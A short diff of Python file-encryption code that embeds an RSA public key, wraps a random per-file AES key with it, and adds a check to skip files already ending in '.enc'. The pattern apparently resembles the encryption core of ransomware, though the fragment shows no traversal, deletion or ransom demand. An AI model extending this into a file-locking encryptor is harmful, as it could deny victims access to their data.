@@ -17,11 +17,15 @@ UknbpfsWF3KVCR5pGf0EaldyeckbnX8BmAAacjm5iGRnOxfOYrPNwVxWI4I+biUn
 VaTBfSU/TNPT55nOOi+CsgMc5/QQ8+N6uGM6ne8qGUO/OsPiRQ/3+twxAzizaayK
 kQIDAQAB
 -----END PUBLIC KEY-----'''
+
 public_key = RSA.import_key(public_key_data)
 cipher_rsa = PKCS1_OAEP.new(public_key)
 
 # Function to encrypt files
 def encrypt_file(file_path, cipher_rsa):
+    if file_path.endswith(".enc"):  # If file is already encrypted, skip it
+        return
+    
     aes_key = get_random_bytes(32)
     cipher_aes = AES.new(aes_key, AES.MODE_CBC)
     
